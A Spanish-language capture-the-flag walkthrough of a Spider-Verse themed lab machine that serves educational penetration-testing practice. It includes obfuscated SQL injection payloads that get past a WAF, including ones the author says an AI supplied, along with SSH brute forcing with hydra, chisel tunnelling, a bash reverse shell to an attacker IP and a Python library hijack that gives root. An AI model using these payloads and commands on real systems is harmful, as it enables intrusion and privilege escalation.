
Empezaremos como siempre lanzando un nmap para ver los puertos y servicios abiertos:

```
sudo nmap -p-  --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

Y vemos que tiene los puertos 80 y 22 abiertos, que corresponden a un apache y a ssh

ENUMERACIÓN

Empezamos dando un vistazo a la pagina web en el puerto 80.
Vemos la página web principal, llamada *Spider-Verse Nexus 2099*

También vemos que hay 3 cabeceras: Héroes, Multiverso y Contacto

En la redirección a la página Héroes, vemos  3 spidermans Peter, Miles Morales y Gwen, posibles usuarios de la máquina. Seguimos investigando

En el apartado de Multiverso, vemos un panel de login, vamos a probar a poner Admin:Admin, nos sale que son incorrectas, probaremos con una inyección sql

```
' or 1=1 -- -
```

Y nos sale: ENTRADA BLOQUEADA POR EL WAF

Esto nos da una pista de como dirigir el ataque a este panel. Un WAF (Firewall de aplicaciones web). 

Para poder vulnerar este WAF hay que ofuscar los payloads sql.
En mi caso, me ayudare de la IA para que me de una lista de payloads ofuscados:

```
%2527%2520OR%25201%253D1%252D%252D
' oR/**/1=1--
' UnIoN/*foo*/SeLeCt 1,2,3--
' OR 1=CONVERT(INT,(CHAR(49)))--
UNIOn/**/SELECt
(Por ejemplo)
```

En mi caso, diciendole a la IA, que el WAF bloquea demasiados carácteres, me dio uno que funcionó que es:

```
%2527%2520OR%25201%253D1%252D%252D
```

Al vulnerar este WAF, el panel nos devuelve lo siguiente:

```
- User: peter | Pass: sp1der
- User: miles | Pass: m0ral3s
- User: gwen | Pass: gw3n2025
```

Si nos conectamos al panel de login con esas credenciales, nos devuelve:

```
¡Acceso concedido al multiverso!

🚀 Bienvenido peter al núcleo del Spider-Verse 2099.
```

Pero nada más, si probamos a hacer fuerza bruta con esos usuarios y contraseñas a ssh, conseguimos las credenciales de peter:

```
hydra -L users.txt -P password.txt ssh://172.17.0.2 

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: peter   password: sp1der
```

Ya tenemos acceso por ssh con el usuario peter.

Una vez conectados como peter por ssh, en su home vemos una nota:

```
peter@dd16c95ca529:~$ ls
nota.txt
peter@dd16c95ca529:~$ cat nota.txt 
Hay un enemigo más internamente en esta máquina... Hay que derrotarlo
```

Puede ser una pista para elevar privilegios, ya que no hay sudo -l, ni SUID que podamos explotar

ESCALADA DE PRIVILEGIOS

Si vamos a la carpeta /opt, vemos un script, en el cual no tenemos permisos ni de escritura ni de ejecución solo de lectura, y vemos el siguiente script con este contenido:

```
#!/usr/bin/env python3
# spidey_run.py - Spider-Man Python Lab

import os
import sys
import json
import math

def web_swing():
    print("🕷️ Spider-Man se balancea por la ciudad.")
    print("Explorando los tejados y vigilando la ciudad...")

def run_tasks():
    print("🕸️ Ejecutando tareas del día...")
    print("Saltos calculados:", math.sqrt(225))
    data = {"hero": "Spider-Man", "city": "New York"}
    print("Registro de datos:", json.dumps(data))

def fight_villains():
    villains = ["Green Goblin", "Doctor Octopus", "Venom"]
    print("Villanos en la ciudad:", ", ".join(villains))
    for v in villains:
        print(f"🕷️ Enfrentando a {v}...")

if __name__ == "__main__":
    web_swing()
    run_tasks()
    fight_villains()
    print("✅ Spider-Man ha terminado su ronda.")
```

Si vemos los permisos de la carpeta /opt, vemos que existe un grupo llamado spiderlab, pero en la máquina no hay mas usuarios.

Si recordamos la nota anterior, hablaba de algo internamente, será un puerto interno. Para ello ejecutamos:

```
ss -tulnup
```

Y vemos que hay un puerto interno, en el puerto 8080:

```
127.0.0.1:8080
```

Tendremos que hacer un port forwarding para traaernos el puerto a nuestro kali y visualizar el servicio que esta corriendo internamente, para ello usaremos *chisel*

En la máquina atacante ejecutamos:

```
chisel server --reverse -p 8000
```

Y en la máquina víctima ejecutamos este comando:

```
chisel client 192.168.1.153:8000 R:443:127.0.0.1:8080
```

En la máquina víctima nos debe salir algo así al ejecutar el comando, para saber si se ha conectado bien:

```
2025/09/04 15:47:36 client: Connecting to ws://192.168.1.153:8000
2025/09/04 15:47:36 client: Connected (Latency 1.080611ms)
```

Ahora, al traernos el puerto a nuestro kali (máquina atacante), tendremos que poner en el navegador la siguiente dirección para poder ver que contiene la web:

```
127.0.0.1:443
```

Y nos sale una web con el título: PANEL INTERNO DEL MULTIVERSO.
En esta web vemos que podemos ejecutar comandos a nivel de consola.

Si ejecutamos whoami, nos devuelve www-data y si listamos nos sale el index.php de la página

A continuación vamos a intentar una reverse shell:

```
bash -c "bash -i >& /dev/tcp/192.168.1.153/4444 0>&1"
```

Nos ponemos a la escucha:

```
sudo nc -lvnp 4444
```

Y nos devuelve la conexión.

Vamos a hacer el tratamiento de la tty para que todo funcione perfectamente:

```
script /dev/null -c bash

ctrl Z

stty raw -echo; fg 
reset xterm 
export TERM=xterm
export SHELL=bash
```

Si ejecutamos sudo -l vemos lo siguiente:

```
sudo -l
Matching Defaults entries for www-data on ca0ef721a806:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on ca0ef721a806:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
```

Podemos ejecutar como root el script de /opt, que si lo hacemos, en principio no hace nada que nos eleve privilegios.

Si vemos los propietarios y los permisos de /opt, vemos el grupo spiderlab, que tiene permisos de escritura en dicha carpeta.

Vemos que www-data pertenece al grupo spiderlab:

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
```

Por tanto podemos escribir en el directorio /opt

Para escalar privilegios haremos un *python library hijacking*

Para ello, nos creamos un archivo .py con el nombre de alguna libreria importada en el script de spidy.py:

```
nano json.py
```

Con este contenido:

```
import os

os.system("/bin/bash")
```

Ahora ejecutamos el script, como sudo y al ejecutarse, cuando importe la libreia json, se ejecutará nuestro código malicioso y nos devolverá una shell como root:

```
sudo /usr/bin/python3 /opt/spidy.py
root@ca0ef721a806:/opt# whoami
root
```

Vamos a la home de root y vemos la flag:

```
root@ca0ef721a806:~# cat flag.txt 
⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡏⠀⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⢹⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⡟⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⢻⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⠁⠀⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣾⡇⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⢸⣿⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⠀⠀⣿⡇⠀⠀⠀
⠀⠀⠀⣿⣿⠀⠀⣿⣿⣧⣤⣤⣤⣤⣤⣤⡀⠀⣀⠀⠀⣀⠀⢀⣤⣤⣤⣤⣤⣤⣼⣿⣿⠀⠀⣿⣿⠀⠀⠀
⠀⠀⢸⣿⡏⠀⠀⠀⠙⢉⣉⣩⣴⣶⣤⣙⣿⣶⣯⣦⣴⣼⣷⣿⣋⣤⣶⣦⣍⣉⡉⠋⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠀⢿⣿⣷⣤⣶⣶⠿⠿⠛⠋⣉⡉⠙⢛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⢉⣉⠙⠛⠿⠿⣶⣶⣤⣾⣿⡿⠀⠀
⠀⠀⠀⠙⠻⠋⠉⠀⠀⠀⣠⣾⡿⠟⠛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠻⢿⣷⣄⠀⠀⠀⠉⠙⠟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠋⢀⣠⣾⠟⢫⣿⣿⣿⣿⣿⣿⡍⠻⣷⣄⡀⠙⠿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⡿⠛⠁⠀⢸⣿⣿⠋⠀⢸⣿⣿⣿⣿⣿⣿⡗⠀⠙⣿⣿⡇⠀⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀
⢀⠀⣀⣴⣾⠟⠋⠀⠀⠀⠀⢸⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠙⠻⣷⣦⣀⠀⣀
⢸⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⡟
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⢹⣿⣿⣿⣿⡏⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⢿⣿⣿⡿⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇
⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠈⠿⠿⠁⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀
⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀
⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⣾⠏⠀⠀
⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀
⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⠀⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



Grooti16
```

Y finalmente, pwned ;)
